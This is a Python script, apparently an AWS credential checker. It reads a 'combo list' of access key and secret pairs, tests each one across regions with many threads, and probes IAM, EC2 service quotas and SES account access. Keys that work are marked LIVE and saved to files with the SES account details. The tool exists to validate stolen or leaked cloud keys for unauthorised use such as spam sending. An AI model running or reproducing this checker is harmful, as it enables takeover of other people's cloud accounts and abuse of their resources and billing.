import os
import re
import boto3
import logging
import queue
import json
import threading

if not os.path.isfile(".region"):
    exit(".region file not found")

kombo = input("combo list: ")
thread = int(input("thread: "))

q = queue.Queue(thread)
lock = threading.Lock()
logging.basicConfig(format="%(message)s", level=logging.INFO)
stop = False


class Client:
    def __init__(self, aws_access_key_id, aws_secret_access_key, region_name):
        self.access_key = aws_access_key_id
        self.secret_key = aws_secret_access_key
        self.region = region_name

    def client(self, name, *args, **kwargs):
        client = boto3.client(name,
                              aws_access_key_id=self.access_key,
                              aws_secret_access_key=self.secret_key,
                              region_name=self.region
                              )
        return client

    def sformat(self, s, code=92, status="LIVE"):
        return "[ \x1b[{0}m{5}\x1b[0m ] \x1b[{0}m{1}\x1b[0m: {2}|{3}|{4}".format(
            code, s, self.access_key, self.secret_key, self.region, status
        )

    def parse_error(self, e, n=""):
        r = re.search(r"\(([^)]+)", str(e))
        if r is not None:
            return self.sformat(r.group(1) + ":" + n, 91, "DIE")
        return self.sformat(n, 91, "DIE")

    def check_iam(self):
        iam = self.client("iam")
        iam.list_users()

        return "IAM", None

    def check_service_quotas(self):
        sq = self.client("service-quotas")
        response = sq.list_service_quotas(ServiceCode="ec2")

        return "P", None

    def check_get_account(self):
        sesv2 = self.client("sesv2")
        response = sesv2.get_account()

        return "SESSKEY", response


def worker():
    while not stop:
        args = q.get()
        client = Client(*args)
        for funcname in (i for i in dir(client) if i.startswith("check_")):
            name = funcname[6:]
            try:
                name, resp = getattr(client, funcname)()
                logging.info(client.sformat(funcname[6:]))

                lock.acquire()
                with open("{}_live.txt".format(name), "a") as fp:
                    fp.write("{}|{}|{}\n".format(
                        client.access_key, client.secret_key, client.region))
                    if resp:
                        try:
                            fp.write(json.dumps(resp) + "\n")
                        except Exception:
                            fp.write(str(resp) + "\n")
                lock.release()

            except Exception as e:
                logging.error(client.parse_error(e, name))
        q.task_done()


ths = []
try:
    for _ in range(thread):
        th = threading.Thread(target=worker)
        th.setDaemon(True)
        th.start()
        ths.append(th)

    with open(".region") as reg, open(kombo) as kom:
        regs = reg.read().splitlines()
        for l1 in kom.read().splitlines():
            l1 = l1.split("|")[:2]
            for l2 in regs:
                q.put([*l1, l2])

    q.join()
except:
    pass
